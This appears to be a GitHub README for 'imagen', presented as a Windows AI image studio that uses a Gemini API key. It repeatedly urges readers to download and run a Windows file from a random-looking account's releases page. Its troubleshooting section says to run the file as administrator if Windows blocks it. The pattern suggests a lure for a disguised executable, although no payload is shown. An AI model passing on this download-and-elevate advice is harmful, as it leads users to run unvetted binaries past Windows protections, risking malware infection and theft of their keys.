# 🎨 imagen - Run Your AI Image Studio

[![Download imagen](https://img.shields.io/badge/Download%20imagen-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Footnotedistressingness573/imagen/releases)

## 🖥️ What imagen does

imagen is a desktop app for running an AI image studio on your own computer. It gives you a simple way to create and manage AI image work from a local app instead of a web tool.

Use it to:
- open the app on Windows
- connect your Gemini API key
- run the app on your computer
- work with AI image tools in one place

## ⬇️ Download imagen for Windows

To get the app, visit the releases page and download and run the Windows file from there:

[Go to the imagen releases page](https://github.com/Footnotedistressingness573/imagen/releases)

Look for the latest release and choose the file made for Windows. If you see a setup file or app file, download it and open it on your PC.

## 🪟 Install on Windows

1. Open the releases page from the link above
2. Find the latest version
3. Download the Windows app file
4. Open the file after the download finishes
5. If Windows asks for permission, choose to run it
6. Follow the on-screen steps until the app opens

If the file is in a ZIP folder, extract it first, then open the app inside the folder

## 🔧 Set up your app

Before you run imagen, you need a Gemini API key.

1. Create or use your Gemini API key
2. Open the `.env.local` file in the app folder
3. Set `GEMINI_API_KEY` to your key
4. Save the file

Example:
GEMINI_API_KEY=your_api_key_here

If you do not have a key yet, get one from your Google AI account before you start the app

## ▶️ Run the app

If you are using the source files instead of a release file, you will need Node.js on your computer.

1. Open the app folder
2. Install the app files:
   npm install
3. Add your Gemini API key in `.env.local`
4. Start the app:
   npm run dev

After the app starts, open the local address shown in the terminal or app window

## 📋 What you need

- Windows 10 or Windows 11
- A stable internet connection
- A Gemini API key
- Node.js if you plan to run from source
- Enough free space for the app and its files

## 🧭 First-time use

1. Start imagen
2. Enter your Gemini API key if asked
3. Wait for the app to load
4. Open the main screen
5. Start your image workflow

If the app does not open right away, close it and open it again after setup is complete

## 🛠️ Common problems

### App does not start
- Check that you downloaded the correct Windows file
- Make sure the download finished
- Try opening the app again

### API key does not work
- Check that `GEMINI_API_KEY` is spelled the same way in `.env.local`
- Make sure the key has no extra spaces
- Confirm the key is active

### The app asks for Node.js
- You may be using the source version
- Install Node.js, then run `npm install`
- Start the app with `npm run dev`

### Windows blocks the file
- Right-click the file
- Choose Run as administrator
- Accept the prompt if Windows asks for permission

## 📁 Project files

- `.env.local` - stores your API key
- `package.json` - lists the app files and commands
- `node_modules` - created after `npm install`
- source files - the app code and interface files

## 🔍 How it fits your workflow

imagen is useful if you want a local app for AI image work with a simple setup. It keeps the main steps in one place:
- download the app
- add your API key
- run the app
- use the image tools

## 📦 Download again later

If you need a fresh copy or a newer build, return to the releases page:

[imagen releases](https://github.com/Footnotedistressingness573/imagen/releases)

## 🧩 File names you may see

The release page may include files such as:
- Windows installer
- portable app file
- ZIP archive
- source bundle

Choose the file that matches your Windows setup and the way you want to open the app